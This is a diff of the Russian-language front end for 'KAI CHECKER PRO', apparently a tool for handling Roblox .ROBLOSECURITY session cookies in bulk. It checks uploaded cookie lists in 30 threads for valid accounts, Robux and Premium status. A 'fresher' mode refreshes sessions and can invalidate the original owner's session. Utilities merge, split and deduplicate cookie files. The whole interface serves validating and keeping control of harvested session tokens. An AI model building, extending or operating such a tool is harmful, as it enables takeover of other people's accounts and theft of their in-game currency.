+            --accent-glow: rgba(168, 85, 247, 0.2);
+            --gradient-btn: linear-gradient(135deg, #7e22ce 0%, #a855f7 100%);
+            --gradient-btn-hover: linear-gradient(135deg, #9333ea 0%, #c026d3 100%);
+        }
+        [data-theme="light"] {
+            --bg: #f5f0ff;
+            --bg-card: rgba(255, 255, 255, 0.75);
+            --border-card: rgba(168, 85, 247, 0.2);
+            --border-hover: rgba(168, 85, 247, 0.5);
+            --input-bg: rgba(243, 232, 255, 0.6);
+            --text-main: #2e1065;
+            --text-muted: #7e22ce;
+            --accent-purple: #7e22ce;
+            --accent-pink: #c026d3;
+            --accent-glow: rgba(126, 34, 206, 0.15);
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; outline: none; }
+        body { font-family: 'Plus Jakarta Sans', sans-serif; min-height: 100vh; background: var(--bg); color: var(--text-main); position: relative; overflow-x: hidden; padding: 24px 16px; }
+        #particles-canvas { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 0; pointer-events: none; }
+        .bg-glow { position: fixed; width: 500px; height: 500px; background: radial-gradient(circle, rgba(168, 85, 247, 0.12) 0%, rgba(0,0,0,0) 70%); top: -100px; left: 50%; transform: translateX(-50%); z-index: 0; pointer-events: none; animation: pulseGlow 8s infinite alternate ease-in-out; }
+        @keyframes pulseGlow { 0% { transform: translateX(-50%) scale(1); opacity: 0.5; } 100% { transform: translateX(-50%) scale(1.2); opacity: 0.8; } }
+        .wrapper { max-width: 1350px; margin: 0 auto; position: relative; z-index: 1; background: var(--bg-card); border: 1px solid var(--border-card); backdrop-filter: blur(20px); border-radius: 28px; padding: 32px; box-shadow: 0 20px 60px rgba(0,0,0,0.6), inset 0 1px 0 rgba(255,255,255,0.05); }
+        .header { display: flex; justify-content: space-between; align-items: center; padding-bottom: 24px; border-bottom: 1px solid var(--border-card); margin-bottom: 28px; flex-wrap: wrap; gap: 16px; }
+        .logo-text { font-family: 'Paytone One', cursive; font-size: 38px; font-weight: 900; background: linear-gradient(135deg, #f472b6 0%, #d946ef 40%, #a855f7 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; transform: skew(-4deg); }
+        .badge-pro { font-size: 11px; font-weight: 800; background: rgba(168, 85, 247, 0.15); color: var(--accent-pink); padding: 4px 12px; border-radius: 20px; border: 1px solid var(--border-card); letter-spacing: 1.5px; }
+        .stats-bar { display: flex; gap: 12px; flex-wrap: wrap; }
+        .stat-card { background: var(--input-bg); border: 1px solid var(--border-card); padding: 8px 16px; border-radius: 16px; display: flex; flex-direction: column; align-items: center; min-width: 90px; }
+        .stat-val { font-size: 16px; font-weight: 800; color: var(--accent-pink); }
+        .stat-lbl { font-size: 10px; color: var(--text-muted); font-weight: 600; text-transform: uppercase; }
+        .tabs { display: flex; gap: 12px; margin-bottom: 32px; background: var(--input-bg); padding: 8px; border-radius: 22px; border: 1px solid var(--border-card); width: fit-content; flex-wrap: wrap; }
+        .tab { padding: 14px 32px; border-radius: 16px; color: var(--text-muted); cursor: pointer; font-size: 15px; font-weight: 700; transition: all 0.3s; border: 1px solid transparent; background: transparent; }
+        .tab:hover { color: var(--text-main); background: rgba(168, 85, 247, 0.1); border-color: rgba(168, 85, 247, 0.2); }
+        .tab.active { background: var(--gradient-btn); color: #fff; border-color: rgba(255, 255, 255, 0.15); box-shadow: 0 6px 18px var(--accent-glow); }
+        .tab-content { display: none; }
+        .tab-content.active { display: block; }
+        .card { background: var(--bg-card); border: 1px solid var(--border-card); border-radius: 20px; padding: 24px; margin-bottom: 20px; transition: all 0.3s; }
+        .card:hover { border-color: var(--border-hover); box-shadow: 0 10px 25px var(--accent-glow); }
+        .card h2 { font-size: 16px; font-weight: 800; margin-bottom: 16px; display: flex; align-items: center; gap: 8px; }
+        .btn { padding: 12px 24px; border: none; border-radius: 14px; font-size: 13px; font-weight: 700; cursor: pointer; color: #fff; display: inline-flex; align-items: center; justify-content: center; gap: 8px; transition: all 0.25s; box-shadow: 0 4px 12px rgba(0,0,0,0.2); }
+        .btn-primary { background: var(--gradient-btn); }
+        .btn-primary:hover { background: var(--gradient-btn-hover); box-shadow: 0 4px 15px var(--accent-glow); transform: translateY(-1px); }
+        .btn-secondary { background: var(--input-bg); border: 1px solid var(--border-card); color: var(--text-muted); }
+        .btn-secondary:hover { color: var(--text-main); border-color: var(--accent-purple); }
+        .btn-danger { background: rgba(239, 68, 68, 0.15); border: 1px solid rgba(239, 68, 68, 0.3); color: #fca5a5; }
+        .btn-danger:hover { background: rgba(239, 68, 68, 0.3); }
+        .btn-sm { padding: 8px 16px; font-size: 12px; border-radius: 10px; }
+        textarea, input[type="number"], input[type="text"] { width: 100%; padding: 14px; background: var(--input-bg); border: 1px solid var(--border-card); border-radius: 14px; color: var(--text-main); font-family: monospace; font-size: 12px; transition: border-color 0.2s; }
+        textarea:focus, input:focus { border-color: var(--accent-pink); box-shadow: 0 0 8px var(--accent-glow); }
+        .upload-area { min-height: 110px; border: 2px dashed var(--border-card); border-radius: 16px; background: var(--input-bg); display: flex; flex-direction: column; align-items: center; justify-content: center; cursor: pointer; transition: all 0.25s; text-align: center; padding: 16px; }
+        .upload-area:hover, .upload-area.drag-over { border-color: var(--accent-pink); background: rgba(168, 85, 247, 0.05); box-shadow: 0 0 10px var(--accent-glow); }
+        .result-container { margin-top: 16px; }
+        .result-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 6px; flex-wrap: wrap; gap: 6px; }
+        .result-title { font-size: 12px; font-weight: 700; color: var(--text-muted); }
+        .action-btn-group { display: flex; gap: 6px; align-items: center; flex-wrap: wrap; }
+        .btn-toggle-box, .btn-download-txt, .btn-download-zip { background: rgba(217, 70, 239, 0.15); border: 1px solid rgba(217, 70, 239, 0.3); color: var(--accent-pink); padding: 4px 12px; border-radius: 8px; font-size: 11px; font-weight: 600; cursor: pointer; transition: all 0.2s; }
+        .btn-toggle-box:hover, .btn-download-txt:hover, .btn-download-zip:hover { background: rgba(217, 70, 239, 0.3); box-shadow: 0 0 8px var(--accent-glow); }
+        .result-box { background: var(--input-bg); border: 1px solid var(--border-card); border-radius: 14px; padding: 14px; max-height: 400px; overflow-y: auto; font-family: monospace; font-size: 12px; color: var(--text-main); white-space: pre-wrap; word-break: break-all; margin-top: 6px; }
+        .progress-bar { margin-top: 12px; background: var(--input-bg); border-radius: 20px; height: 8px; overflow: hidden; border: 1px solid var(--border-card); }
+        .progress-fill { height: 100%; width: 0%; background: var(--gradient-btn); transition: width 0.3s ease; }
+        .progress-text { font-size: 12px; color: var(--text-muted); margin-top: 4px; text-align: center; }
+        .checker-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+        @media(max-width:900px){ .checker-grid { grid-template-columns: 1fr; } }
+        .theme-btn { background: var(--input-bg); border: 1px solid var(--border-card); border-radius: 30px; padding: 8px 16px; cursor: pointer; font-size: 12px; color: var(--text-main); font-weight: 700; transition: all 0.2s; }
+        .theme-btn:hover { border-color: var(--accent-purple); }
+        .footer { text-align: center; padding-top: 20px; color: var(--text-muted); font-size: 12px; font-weight: 600; border-top: 1px solid var(--border-card); margin-top: 24px; }
+        .history-card { background: var(--input-bg); border: 1px solid var(--border-card); border-radius: 16px; padding: 16px; margin-bottom: 14px; }
+        .history-header { display: flex; justify-content: space-between; align-items: center; font-size: 13px; font-weight: 700; color: var(--accent-pink); flex-wrap: wrap; gap: 8px; }
+        .history-users { font-size: 11px; color: var(--text-main); margin-top: 6px; font-weight: 600; display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
+        .tool-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 20px; }
+        .fresher-mode-btn.active-mode { background: var(--gradient-btn) !important; color: #fff !important; border-color: var(--accent-pink) !important; box-shadow: 0 0 12px var(--accent-glow); transform: scale(1.02); }
+        .custom-alert-overlay { position: fixed; top: 24px; right: 24px; z-index: 99999; pointer-events: none; }
+        .custom-alert-card { pointer-events: auto; background: rgba(23, 10, 38, 0.95); border: 1px solid var(--border-hover); box-shadow: 0 10px 30px rgba(0,0,0,0.5), 0 0 15px var(--accent-glow); backdrop-filter: blur(12px); border-radius: 16px; padding: 14px 20px; display: flex; align-items: center; gap: 12px; min-width: 280px; max-width: 360px; transform: translateY(-20px) scale(0.95); opacity: 0; transition: all 0.3s; }
+        .custom-alert-overlay.show .custom-alert-card { transform: translateY(0) scale(1); opacity: 1; }
+        .alert-icon { font-size: 22px; line-height: 1; }
+        .alert-body h3 { margin: 0; color: #fff; font-size: 13px; font-weight: 700; }
+        .alert-body p { color: var(--text-muted); font-size: 12px; margin: 0; word-break: break-word; font-weight: 500; }
+        .alert-close-btn { background: transparent; border: none; color: var(--text-muted); font-size: 16px; cursor: pointer; padding: 4px; line-height: 1; }
+        .alert-close-btn:hover { color: #fff; }
+    </style>
+</head>
 <body>
-<canvas id="particles-canvas"></canvas><div class="bg-glow"></div>
-<div id="custom-alert" class="custom-alert-overlay"><div class="custom-alert-card"><span>⚠️</span><div><h3>Внимание</h3><p id="custom-alert-msg">Вставьте кук!</p></div><button onclick="closeAlert()">✕</button></div></div>
-<div class="wrapper">
-<div class="header"><span class="logo-text">KAI CHECKER</span><span class="badge-pro">PRO</span><div class="stats-bar"><div class="stat-card"><span class="stat-val" id="statValid">0</span><span class="stat-lbl">Валид</span></div><div class="stat-card"><span class="stat-val" id="statRobux">0</span><span class="stat-lbl">Robux</span></div><div class="stat-card"><span class="stat-val" id="statPremium">0</span><span class="stat-lbl">Premium</span></div></div><button onclick="toggleTheme()">🌓</button></div>
-<div class="tabs"><button class="tab active" data-tab="checker">🔍 Чекер</button><button class="tab" data-tab="fresher">🔄 Фрешер</button><button class="tab" data-tab="history">📋 История</button><button class="tab" data-tab="tools">🧰 Инструменты</button></div>
-
-<div class="tab-content active" id="tab-checker">
-<div class="grid-2">
-<div class="card"><h2>🔍 Одиночная</h2><textarea id="singleCookie" rows="5" placeholder="Вставьте ОДИН .ROBLOSECURITY кук..."></textarea><button class="btn" onclick="runSingleCheck()" style="width:100%;margin-top:12px">Проверить</button><div class="result-box" id="singleResult" style="display:none;"></div></div>
-<div class="card"><h2>📦 Массовая (30 потоков)</h2>
-<div class="upload-area" id="massDropArea" onclick="document.getElementById('massFile').click()"><p>📁 Перетащите TXT файл</p><p style="font-size:11px;color:var(--text-muted)">или нажмите</p></div>
-<input type="file" id="massFile" accept=".txt" style="display:none">
-<div id="massFileInfo" style="font-size:12px;color:var(--accent-pink);margin-top:6px"></div>
-<div class="progress-bar"><div class="progress-fill" id="massProgress"></div></div>
-<div class="progress-text" id="massProgressText">Готов</div>
-<button class="btn" onclick="runMassCheckWS()" style="width:100%;margin-top:12px" id="massBtn">🚀 Запустить</button>
-<div class="result-box" id="massResult" style="display:none;"></div>
-</div></div></div>
-
-<div class="tab-content" id="tab-fresher"><div class="card"><h2>🔄 Фрешер</h2>
-<div style="display:flex;gap:12px;margin-bottom:12px;flex-wrap:wrap"><button class="btn" style="background:var(--gradient-btn);color:#fff" id="btnDup" onclick="setFresherMode('duplicate')">♻️ Дублировать</button><button class="btn" style="background:var(--input-bg);color:var(--text-muted)" id="btnKill" onclick="setFresherMode('kill')">💀 Убить старую</button></div>
-<input type="hidden" id="fresherMode" value="duplicate">
-<textarea id="fresherCookies" rows="6" placeholder="Вставьте куки списком..."></textarea>
-<button class="btn" onclick="runFresher()" style="margin-top:12px">⚡ Обновить</button>
-<div class="result-box" id="fresherResult" style="display:none;"></div>
-</div></div>
-
-<div class="tab-content" id="tab-history">
-<div class="card"><h2>📋 История Чекера <button class="btn" style="background:rgba(239,68,68,0.2);color:#fca5a5" onclick="clearCheckerHistory()">🗑️</button></h2><div id="checkerHistoryList">Загрузка...</div></div>
-<div class="card"><h2>🔄 История Фрешера <button class="btn" style="background:rgba(239,68,68,0.2);color:#fca5a5" onclick="clearFresherHistory()">🗑️</button></h2><div id="fresherHistoryList">Загрузка...</div></div>
+<canvas id="particles-canvas"></canvas>
+<div class="bg-glow"></div>
+<div id="custom-alert" class="custom-alert-overlay">
+    <div class="custom-alert-card">
+        <div class="alert-icon">⚠️</div>
+        <div class="alert-body"><h3>Внимание</h3><p id="custom-alert-msg">Вставьте кук!</p></div>
+        <button class="alert-close-btn" onclick="closeAlert()">✕</button>
+    </div>
 </div>
-
-<div class="tab-content" id="tab-tools">
-<div class="grid-2">
-<div class="card"><h3>🔗 Слияние</h3><div class="upload-area" onclick="document.getElementById('mergeFiles').click()"><p>📁 Перетащите TXT</p></div><input type="file" id="mergeFiles" accept=".txt" multiple style="display:none"><button class="btn" onclick="mergeCookies()" style="margin-top:12px;width:100%">Объединить</button><div class="result-box" id="mergeResult" style="display:none"></div></div>
-<div class="card"><h3>✂️ Разделение</h3><div class="upload-area" onclick="document.getElementById('splitFiles').click()"><p>📁 Загрузить TXT</p></div><input type="file" id="splitFiles" accept=".txt" multiple style="display:none"><textarea id="splitInput" rows="2" placeholder="Или вставьте куки..."></textarea><input type="number" id="splitCount" value="1" min="1" style="width:80px;margin-top:6px"><button class="btn" onclick="splitCookies()" style="margin-top:6px;width:100%">Разделить</button><div class="result-box" id="splitResult" style="display:none"></div></div>
-<div class="card"><h3>🧹 Очистка</h3><textarea id="cleanInput" rows="5" placeholder="Вставьте куки..."></textarea><button class="btn" onclick="cleanCookies()" style="margin-top:12px;width:100%">Удалить дубликаты</button><div class="result-box" id="cleanResult" style="display:none"></div></div>
-</div></div>
-<div class="footer">KAI CHECKER © 2026</div>
+<div class="wrapper">
+    <div class="header">
+        <div class="logo-wrap"><span class="logo-text">KAI CHECKER</span><span class="badge-pro">PRO EDITION</span></div>
+        <div class="stats-bar">
+            <div class="stat-card"><span class="stat-val" id="statValid">0</span><span class="stat-lbl">Валид</span></div>
+            <div class="stat-card"><span class="stat-val" id="statRobux">0</span><span class="stat-lbl">Robux</span></div>
+            <div class="stat-card"><span class="stat-val" id="statPremium">0</span><span class="stat-lbl">Premium</span></div>
+        </div>
+        <button class="theme-btn" onclick="toggleTheme()">🌓 Тема</button>
+    </div>
+    <div class="tabs">
+        <button class="tab active" data-tab="checker">🔍 Чекер</button>
+        <button class="tab" data-tab="fresher">🔄 Фрешер</button>
+        <button class="tab" data-tab="history">📋 История</button>
+        <button class="tab" data-tab="tools">🧰 Инструменты</button>
+    </div>
+    <div class="tab-content active" id="tab-checker">
+        <div class="checker-grid">
+            <div class="card">
+                <h2>🔍 Одиночная проверка</h2>
+                <textarea id="singleCookie" placeholder="Вставьте ОДИН .ROBLOSECURITY кук..." rows="5"></textarea>
+                <div style="margin-top:12px;"><button class="btn btn-primary" onclick="runSingleCheck()" style="width:100%;">Проверить кук</button></div>
+                <div class="result-container" id="singleContainer" style="display:none;">
+                    <div class="result-header"><span class="result-title">РЕЗУЛЬТАТ:</span><div class="action-btn-group"><button class="btn-download-txt" onclick="downloadTxtFromBox('singleResult','single_report.txt')">📥 TXT</button><button class="btn-toggle-box" id="btnToggle_singleResult" onclick="toggleBox('singleResult')">▼ Свернуть</button></div></div>
+                    <div class="result-box" id="singleResult"></div>
+                </div>
+            </div>
+            <div class="card">
+                <h2>📦 Массовая проверка (30 Потоков)</h2>
+                <div class="upload-area" id="massDropArea" onclick="document.getElementById('massFile').click()">
+                    <p style="font-weight:700;">📁 Перетащите TXT файл с куками</p>
+                    <p style="font-size:11px;color:var(--text-muted);margin-top:4px;">или нажмите для выбора</p>
+                </div>
+                <input type="file" id="massFile" accept=".txt" style="display:none;">
+                <div id="massFileInfo" style="font-size:12px;color:var(--accent-pink);margin-top:6px;font-weight:600;"></div>
+                <div class="progress-bar"><div class="progress-fill" id="massProgress"></div></div>
+                <div class="progress-text" id="massProgressText">Готов к запуску</div>
+                <div style="margin-top:12px;"><button class="btn btn-primary" onclick="runMassCheckWS()" style="width:100%;" id="massBtn">🚀 Запустить массовый чек</button></div>
+                <div class="result-container" id="massContainer" style="display:none;">
+                    <div class="result-header"><span class="result-title">РЕЗУЛЬТАТЫ:</span><div class="action-btn-group"><button class="btn-download-zip" onclick="downloadMassZip()">📦 ZIP</button><button class="btn-download-txt" onclick="downloadTxtFromBox('massResult','mass_report.txt')">📥 TXT</button><button class="btn-toggle-box" id="btnToggle_massResult" onclick="toggleBox('massResult')">▼ Свернуть</button></div></div>
+                    <div class="result-box" id="massResult"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="tab-content" id="tab-fresher">
+        <div class="card">
+            <h2>🔄 Обновление сессий (20 Потоков)</h2>
+            <div style="display:flex;gap:12px;margin-bottom:14px;align-items:center;flex-wrap:wrap;">
+                <span style="font-size:13px;font-weight:700;color:var(--text-muted);">Режим:</span>
+                <button class="btn btn-secondary btn-sm fresher-mode-btn active-mode" id="btnDup" onclick="setFresherMode('duplicate')">♻️ Дублировать</button>
+                <button class="btn btn-secondary btn-sm fresher-mode-btn" id="btnKill" onclick="setFresherMode('kill')">💀 Инвалидировать старую</button>
+            </div>
+            <input type="hidden" id="fresherMode" value="duplicate">
+            <textarea id="fresherCookies" placeholder="Вставьте куки списком..." rows="6"></textarea>
+            <div style="margin-top:12px;"><button class="btn btn-primary" onclick="runFresher()">⚡ Обновить куки</button></div>
+            <div class="result-container" id="fresherContainer" style="display:none;">
+                <div class="result-header"><span class="result-title">ОБНОВЛЕННЫЕ КУКИ:</span><div class="action-btn-group"><button class="btn-download-txt" onclick="downloadTxtFromBox('fresherResult','refreshed_cookies.txt')">📥 TXT</button><button class="btn-toggle-box" id="btnToggle_fresherResult" onclick="toggleBox('fresherResult')">▼ Свернуть</button></div></div>
+                <div class="result-box" id="fresherResult"></div>
+            </div>
+        </div>
+    </div>
+    <div class="tab-content" id="tab-history">
+        <div class="card"><h2>📋 История Чекера <button class="btn btn-danger btn-sm" onclick="clearCheckerHistory()" style="margin-left:auto;">🗑️ Очистить</button></h2><div id="checkerHistoryList">Загрузка...</div></div>
+        <div class="card"><h2>🔄 История Фрешера <button class="btn btn-danger btn-sm" onclick="clearFresherHistory()" style="margin-left:auto;">🗑️ Очистить</button></h2><div id="fresherHistoryList">Загрузка...</div></div>
+    </div>
+    <div class="tab-content" id="tab-tools">
+        <div class="tool-grid">
+            <div class="card"><h3>🔗 Слияние TXT</h3><div class="upload-area" id="mergeDropArea" onclick="document.getElementById('mergeFiles').click()"><p style="font-weight:700;">📁 Перетащите TXT</p><p style="font-size:11px;color:var(--text-muted);margin-top:4px;">выберите несколько</p></div><input type="file" id="mergeFiles" accept=".txt" multiple style="display:none;"><div id="mergeFileInfo" style="font-size:12px;color:var(--accent-pink);margin-top:6px;font-weight:600;"></div><button class="btn btn-primary btn-sm" onclick="mergeCookies()" style="margin-top:12px;width:100%;">Объединить</button><div class="result-box" id="mergeResult" style="display:none;margin-top:10px;"></div></div>
+            <div class="card"><h3>✂️ Разделение</h3><div class="upload-area" id="splitDropArea" onclick="document.getElementById('splitFiles').click()"><p style="font-weight:700;">📁 Загрузить TXT</p><p style="font-size:11px;color:var(--text-muted);margin-top:4px;">или вставьте куки</p></div><input type="file" id="splitFiles" accept=".txt" multiple style="display:none;"><div id="splitFileInfo" style="font-size:12px;color:var(--accent-pink);margin-top:6px;font-weight:600;"></div><textarea id="splitInput" placeholder="Или вставьте куки списком..." rows="3" style="margin-top:10px;"></textarea><div style="margin-top:10px;display:flex;align-items:center;gap:10px;"><label style="font-size:12px;font-weight:700;color:var(--text-muted);">Куков на файл:</label><input type="number" id="splitCount" value="1" min="1" style="padding:8px 12px;width:100px;"></div><button class="btn btn-primary btn-sm" onclick="splitCookies()" style="margin-top:12px;width:100%;">Разделить</button><div class="result-box" id="splitResult" style="display:none;margin-top:10px;"></div></div>
+            <div class="card"><h3>🧹 Очистка</h3><textarea id="cleanInput" placeholder="Вставьте куки для дедупликации..." rows="5"></textarea><button class="btn btn-primary btn-sm" onclick="cleanCookies()" style="margin-top:12px;width:100%;">Удалить дубликаты</button><div class="result-box" id="cleanResult" style="display:none;margin-top:10px;"></div></div>
+        </div>
+    </div>
+    <div class="footer">KAI CHECKER © ALL RIGHTS RESERVED</div>
 </div>
 
 <script>
@@ -755,43 +217,51 @@ socket.on('mass_progress', function(data) {
     document.getElementById('massProgress').style.width = Math.round((data.current / data.total) * 100) + '%';
     document.getElementById('massProgressText').textContent = '⏳ ' + data.current + '/' + data.total;
     if (data.result) {
+        document.getElementById('massContainer').style.display = 'block';
         document.getElementById('massResult').style.display = 'block';
+        document.getElementById('btnToggle_massResult').textContent = '▼ Свернуть';
         let currentText = document.getElementById('massResult').textContent;
-        if (currentText.startsWith('⏳')) {
+        if (currentText === '⏳ Массовая проверка...' || currentText === '') {
             document.getElementById('massResult').textContent = data.result;
         } else {
-            document.getElementById('massResult').textContent = currentText + '\n' + data.result;
+            document.getElementById('massResult').textContent = currentText + '\n\n' + data.result;
         }
         document.getElementById('massResult').scrollTop = document.getElementById('massResult').scrollHeight;
+        if (data.full_report) { lastMassReports.push(data.full_report); }
     }
 });
 
 socket.on('mass_complete', function(data) {
     document.getElementById('massProgress').style.width = '100%';
-    document.getElementById('massProgressText').textContent = '✅ Проверка завершена';
+    document.getElementById('massProgressText').textContent = '✅ Проверка завершена!';
     document.getElementById('massBtn').disabled = false;
     document.getElementById('massBtn').textContent = '🚀 Запустить массовый чек';
+    
+    // Перезаписываем massResult и высвечиваем полный итоговый отчет
+    document.getElementById('massContainer').style.display = 'block';
+    document.getElementById('massResult').style.display = 'block';
+    document.getElementById('massResult').textContent = data.message;
+    document.getElementById('massResult').scrollTop = 0;
+
+    // Обновляем статистику в шапке
     document.getElementById('statValid').textContent = data.valid_count || 0;
     document.getElementById('statRobux').textContent = (data.total_robux || 0).toLocaleString();
     document.getElementById('statPremium').textContent = data.premium_count || 0;
-    
-    if (data.message) {
-        document.getElementById('massResult').textContent = data.message;
-        document.getElementById('massResult').style.display = 'block';
-    }
 });
 
 socket.on('mass_error', function(data) {
     document.getElementById('massProgressText').textContent = '❌ ' + data.message;
     document.getElementById('massBtn').disabled = false;
     document.getElementById('massBtn').textContent = '🚀 Запустить массовый чек';
+    showAlert(data.message);
 });
 
 const canvas = document.getElementById('particles-canvas');
 const ctx = canvas.getContext('2d');
 let particles = [];
 function resizeCanvas() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
-window.addEventListener('resize', resizeCanvas); resizeCanvas();
+window.addEventListener('resize', resizeCanvas);
+resizeCanvas();
 for(let i=0; i<40; i++) {
     particles.push({
         x: Math.random() * canvas.width, y: Math.random() * canvas.height,
@@ -814,407 +284,640 @@ function animateParticles() {
 animateParticles();
 
 let alertTimeout;
-function showAlert(msg) { document.getElementById('custom-alert-msg').innerText = msg; document.getElementById('custom-alert').classList.add('show'); clearTimeout(alertTimeout); alertTimeout = setTimeout(() => { document.getElementById('custom-alert').classList.remove('show'); }, 4000); }
+function showAlert(message) {
+    document.getElementById('custom-alert-msg').innerText = message || 'Вставьте кук!';
+    document.getElementById('custom-alert').classList.add('show');
+    clearTimeout(alertTimeout);
+    alertTimeout = setTimeout(function() { document.getElementById('custom-alert').classList.remove('show'); }, 4000);
+}
 function closeAlert() { document.getElementById('custom-alert').classList.remove('show'); }
 
-function toggleTheme() { document.documentElement.setAttribute('data-theme', document.documentElement.getAttribute('data-theme') === 'dark' ? 'light' : 'dark'); }
-
-function activateTab(tabName) {
-    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-    document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
-    document.querySelector('.tab[data-tab="' + tabName + '"]')?.classList.add('active');
-    document.getElementById('tab-' + tabName)?.classList.add('active');
+function toggleTheme() {
+    var html = document.documentElement;
+    html.setAttribute('data-theme', html.getAttribute('data-theme')==='dark'?'light':'dark');
 }
-document.querySelectorAll('.tab').forEach(tab => tab.addEventListener('click', function() { activateTab(this.dataset.tab); }));
+
+function toggleBox(boxId) {
+    var box = document.getElementById(boxId);
+    var btn = document.getElementById('btnToggle_' + boxId);
+    if (!box) return;
+    if (box.style.display === 'none') {
+        box.style.display = 'block';
+        if (btn) btn.textContent = '▼ Свернуть';
+    } else {
+        box.style.display = 'none';
+        if (btn) btn.textContent = '▶ Развернуть';
+    }
+}
+
+function downloadTxtFromBox(boxId, defaultFilename) {
+    var box = document.getElementById(boxId);
+    if (!box || !box.textContent.trim()) return showAlert('Нет данных!');
+    var blob = new Blob([box.textContent], { type: 'text/plain;charset=utf-8' });
+    var url = URL.createObjectURL(blob);
+    var a = document.createElement('a');
+    a.href = url; a.download = defaultFilename;
+    document.body.appendChild(a); a.click(); document.body.removeChild(a);
+    URL.revokeObjectURL(url);
+}
 
 function setupDragAndDrop(areaId, inputId, infoId) {
-    const area = document.getElementById(areaId);
-    const input = document.getElementById(inputId);
-    const info = document.getElementById(infoId);
+    var area = document.getElementById(areaId);
+    var input = document.getElementById(inputId);
+    var info = document.getElementById(infoId);
     if(!area || !input) return;
-    area.addEventListener('dragover', e => { e.preventDefault(); area.classList.add('drag-over'); });
-    area.addEventListener('dragleave', e => { e.preventDefault(); area.classList.remove('drag-over'); });
-    area.addEventListener('drop', e => {
-        e.preventDefault(); area.classList.remove('drag-over');
+    ['dragenter', 'dragover'].forEach(function(e) { area.addEventListener(e, function(prev) { prev.preventDefault(); area.classList.add('drag-over'); }); });
+    ['dragleave', 'drop'].forEach(function(e) { area.addEventListener(e, function(prev) { prev.preventDefault(); area.classList.remove('drag-over'); }); });
+    area.addEventListener('drop', function(e) {
         if(e.dataTransfer.files.length) {
             input.files = e.dataTransfer.files;
             if(info) info.textContent = 'Выбрано файлов: ' + input.files.length + ' (' + input.files[0].name + ')';
         }
     });
     input.addEventListener('change', function() {
-        if(this.files.length && info) info.textContent = 'Выбрано файлов: ' + this.files.length + ' (' + this.files[0].name + ')';
+        if(this.files.length && info) {
+            info.textContent = 'Выбрано файлов: ' + this.files.length + ' (' + this.files[0].name + ')';
+        }
     });
 }
 setupDragAndDrop('massDropArea', 'massFile', 'massFileInfo');
 setupDragAndDrop('mergeDropArea', 'mergeFiles', 'mergeFileInfo');
 setupDragAndDrop('splitDropArea', 'splitFiles', 'splitFileInfo');
 
+function activateTab(tabName) {
+    document.querySelectorAll('.tab').forEach(function(t) { t.classList.remove('active'); });
+    document.querySelectorAll('.tab-content').forEach(function(c) { c.classList.remove('active'); });
+    var targetBtn = document.querySelector('.tab[data-tab="' + tabName + '"]');
+    var targetContent = document.getElementById('tab-' + tabName);
+    if(targetBtn && targetContent) {
+        targetBtn.classList.add('active');
+        targetContent.classList.add('active');
+        localStorage.setItem('kai_active_tab', tabName);
+        if(tabName === 'history') { loadCheckerHistory(); loadFresherHistory(); }
+    }
+}
+document.querySelectorAll('.tab').forEach(function(tab) {
+    tab.addEventListener('click', function() { activateTab(this.dataset.tab); });
+});
+window.addEventListener('DOMContentLoaded', function() {
+    activateTab(localStorage.getItem('kai_active_tab') || 'checker');
+});
+
 async function runSingleCheck() {
-    const cookie = document.getElementById('singleCookie').value.trim();
+    var cookie = document.getElementById('singleCookie').value.trim();
     if(!cookie) return showAlert('Вставьте кук!');
+    document.getElementById('singleContainer').style.display = 'block';
     document.getElementById('singleResult').style.display = 'block';
+    document.getElementById('btnToggle_singleResult').textContent = '▼ Свернуть';
     document.getElementById('singleResult').textContent = '⏳ Проверка...';
-    const res = await fetch('/api/single-check', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({cookie}) });
-    const data = await res.json();
+    var res = await fetch('/api/single-check', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({cookie: cookie}) });
+    var data = await res.json();
     document.getElementById('singleResult').textContent = data.report || 'Ошибка';
 }
 
 async function runMassCheckWS() {
-    const file = document.getElementById('massFile').files[0];
+    var file = document.getElementById('massFile').files[0];
     if(!file) return showAlert('Выберите TXT файл!');
     document.getElementById('massBtn').disabled = true;
     document.getElementById('massBtn').textContent = '⏳ Проверка...';
     document.getElementById('massProgress').style.width = '0%';
     document.getElementById('massProgressText').textContent = '⏳ Подготовка...';
+    document.getElementById('massContainer').style.display = 'block';
     document.getElementById('massResult').style.display = 'block';
-    document.getElementById('massResult').textContent = '⏳ Массовая проверка...\n';
+    document.getElementById('massResult').textContent = '⏳ Массовая проверка...';
+    document.getElementById('btnToggle_massResult').textContent = '▼ Свернуть';
     lastMassReports = [];
-    const fd = new FormData();
+    var fd = new FormData();
     fd.append('file', file);
     try {
-        const res = await fetch('/api/mass-check-ws', { method: 'POST', body: fd });
-        const data = await res.json();
-        if(!data.success) showAlert(data.message || 'Ошибка');
-    } catch(e) { showAlert('Ошибка соединения'); }
-    document.getElementById('massBtn').disabled = false;
-    document.getElementById('massBtn').textContent = '🚀 Запустить массовый чек';
+        var res = await fetch('/api/mass-check-ws', { method: 'POST', body: fd });
+        var data = await res.json();
+        if(!data.success) {
+            showAlert(data.message || 'Ошибка');
+            document.getElementById('massBtn').disabled = false;
+            document.getElementById('massBtn').textContent = '🚀 Запустить массовый чек';
+        }
+    } catch(e) {
+        showAlert('Ошибка соединения');
+        document.getElementById('massBtn').disabled = false;
+        document.getElementById('massBtn').textContent = '🚀 Запустить массовый чек';
+    }
 }
 
-async function downloadMassZip() { if(!lastMassReports.length) return showAlert('Нет отчетов!'); const res = await fetch('/api/download-zip', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({reports: lastMassReports}) }); const blob = await res.blob(); const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = 'accounts_reports.zip'; document.body.appendChild(a); a.click(); document.body.removeChild(a); }
+async function downloadMassZip() {
+    if (!lastMassReports.length) return showAlert('Нет отчетов!');
+    var res = await fetch('/api/download-zip', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({reports: lastMassReports}) });
